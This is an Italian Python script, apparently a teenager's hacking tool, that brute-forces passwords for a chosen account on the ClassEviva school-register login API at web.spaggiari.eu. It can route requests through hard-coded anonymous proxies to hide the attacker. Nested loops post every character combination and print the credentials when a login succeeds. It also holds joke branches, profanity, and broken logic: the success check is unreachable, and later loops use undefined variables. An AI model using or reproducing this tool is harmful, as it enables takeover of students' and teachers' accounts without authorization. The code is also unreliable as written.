import os
import webbrowser
import json
import requests 
import colorama
import time
from colorama import Fore

# Grazie Andrea ❤

colorama.init()


time.sleep(1) # inutile ma volevo metterlo
print("")
print("")
username = input("Inserisci username o indirizzo email: ")
print(Fore.RED + """SE NON SAI CHE COSA SONO LE PROXY PER FAVORE NON PROVARE A MODIFICARE NULLA \nINFORMATI PRIMA E METTI NO GRAZIE :) """,)
print(Fore.CYAN)
porcodio = input("Utilizzare un proxy? [SI]|[NO]|[BO]|[L]|[PUTIN]: ")

print(Fore.BLUE + """ATTENZIONE, LE PROXY POTREBBERO ESSERE OFFLINE""",)
print(Fore.BLUE + """IN QUESTO CASO SI CONSIGLIA DI CAMBIARE PROXY O ASPETTARE QUALCHE ORA""",)

print(Fore.CYAN)

proxies = {"http" : "http://172.105.13.173:80", # Canada , Quebec , Anonymous (questa è la miglior proxy per velocità e risposta)
           "https": "https://159.197.128.41:3128"} # Inghilterra , Londra , Anonymous (questa è la miglior proxy https per risposta, la velocià porebbe essere migliorata) continuo sotto...
                                                   # Se vuoi trovare nuove proxy clicca su sito.spys.bat

Alfabeto = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ".", ",", "-", "_", "@", "+", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

def Balls(password):
    if porcodio == "SI":
        r = requests.post("https://web.spaggiari.eu/auth/app/default/AuthApi4.php?a=aLoginPwd", proxies = proxies, data={"uid":username,"pwd":password})
    else:
        r = requests.post("https://web.spaggiari.eu/auth/app/default/AuthApi4.php?a=aLoginPwd", data={"uid":username,"pwd":password})
    if porcodio == "NO":
        clear = lambda: os.system("cls")
        clear()
        time.sleep(2)
        print("CLASSEVIVA E' PROPRIETA' DEL GOVERNO ITALIANO, PER RAGIONI DI SICUREZZA DEI NOSTRI UTENTI CONSIGLIAMO DI UTILIZZARE LE PROXY")
        print("RIAVVIA IL PROGRAMMA E DIGITA SI PER FAVORE")
        time.sleep(5)
        exit()
    if porcodio == "BO":
        clear = lambda: os.system("cls")
        clear()
        time.sleep(1)
        print("")
        print("")
        print(Fore.RED + """l'hai voluto tu, lo script si è interrotto... non sai prendere neanche una decisione""")
        exit()
    if porcodio == "L":
        clear = lambda: os.system("cls")
        clear()
        print("")
        print("")
        print(Fore.LIGHTMAGENTA_EX + """
        
██╗         ██████╗ ███████╗██████╗     ████████╗███████╗    ██████╗ ██████╗  ██████╗ 
██║         ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗
██║         ██████╔╝█████╗  ██████╔╝       ██║   █████╗      ██████╔╝██████╔╝██║   ██║
██║         ██╔═══╝ ██╔══╝  ██╔══██╗       ██║   ██╔══╝      ██╔══██╗██╔══██╗██║   ██║
███████╗    ██║     ███████╗██║  ██║       ██║   ███████╗    ██████╔╝██║  ██║╚██████╔╝
╚══════╝    ╚═╝     ╚══════╝╚═╝  ╚═╝       ╚═╝   ╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
                                                                                      
""")
        time.sleep(1)
        webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
        time.sleep(0.3)
        webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
        time.sleep(0.3)
        webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
        time.sleep(30)
        exit()

if porcodio == "PUTIN":
    webbrowser.open("https://www.youtube.com/watch?v=t-wFKNy0MZQ")
    print("какэтосделано ")
    print("")
    print("")
    print("Sei Sus")
    time.sleep(20)
    exit()

    r = r.json()
    r = r['data']['auth']['loggedIn']
    if r == True:
        print(Fore.GREEN + """CREDENZIALI TROVATE, ORA SEI UN BIG HACKER""")
        print("Username: ",username)
        print("Password: ",password)
        input("Premi ENTER per uscire")
        exit()
    else:
        print ("  username: ",username,"   password: ",password, "   Status: ", r)

for c1 in Alfabeto:
    for c2 in Alfabeto:
        for c3 in Alfabeto:
            for c4 in Alfabeto:
                psw = c1+c2+c3+c4 
                Balls(psw)
                for c5 in Alfabeto:
                    psw = c1+c2+c3+c4+c5   
                    Balls(psw)
                    for c6 in Alfabeto:
                        psw = c1+c2+c3+c4+c5+c6
                        Balls(psw)
                        for c7 in Alfabeto:
                            psw = c1+c2+c3+c4+c5+c6+c7
                            Balls(psw)
                            for c8 in Alfabeto:
                                psw = c1+c2+c3+c4+c5+c6+c7+c8
                                Balls(psw)
                                for c9 in Alfabeto:
                                    psw = c1+c2+c3+c4+c5+c6+c7+c8+c9
                                    Balls(psw)
                                    for c10 in Alfabeto:
                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10
                                        Balls(psw)
                                        for c11 in Alfabeto:
                                            psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11
                                            Balls(psw)
                                            for c12 in Alfabeto:
                                                psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12
                                                Balls(psw)
                                                for c13 in Alfabeto:
                                                    psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13
                                                    for c14 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c14
                                                        Balls(psw)
                                                    for c15 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15
                                                        Balls(psw)
                                                    for c16 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16
                                                        Balls(psw)
                                                    for c17 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17
                                                        Balls(psw)
                                                    for c18 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18
                                                        Balls(psw)
                                                    for c19 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c18+c19
                                                        Balls(psw)
                                                    for c20 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20
                                                        Balls(psw)
                                                    for c21 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21
                                                        Balls(psw)
                                                    for c22 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22
                                                        Balls(psw)
                                                    for c23 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23
                                                        Balls(psw)
                                                    for c24 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24
                                                        Balls(psw)
                                                    for c25 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25
                                                        Balls(psw)
                                                    for c26 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26
                                                        Balls(psw)
                                                    for c27 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27
                                                        Balls(psw)
                                                    for c28 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28
                                                        Balls(psw)
                                                    for c29 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29
                                                        Balls(psw)
                                                    for c20 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30
                                                        Balls(psw)
                                                    for c30 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31
                                                        Balls(psw)
                                                    for c31 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31
                                                        Balls(psw)
                                                    for c32 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32
                                                        Balls(psw)
                                                    for c33 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33
                                                        Balls(psw)
                                                    for c34 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34
                                                        Balls(psw)
                                                    for c35 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34+c35
                                                        Balls(psw)
                                                    for c36 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34+c35+c36
                                                        Balls(psw)
                                                    for c37 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34+c35+c36+c37
                                                        Balls(psw)
                                                    for c38 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34+c35+c36+c37+c38
                                                        Balls(psw)
                                                    for c39 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34+c35+c36+c37+c38+c39
                                                        Balls(psw)
                                                    for c40 in Alfabeto:
                                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30+c31+c32+c33+c34+c35+c36+c37+c38+c39+c40
                                                        Balls(psw)


















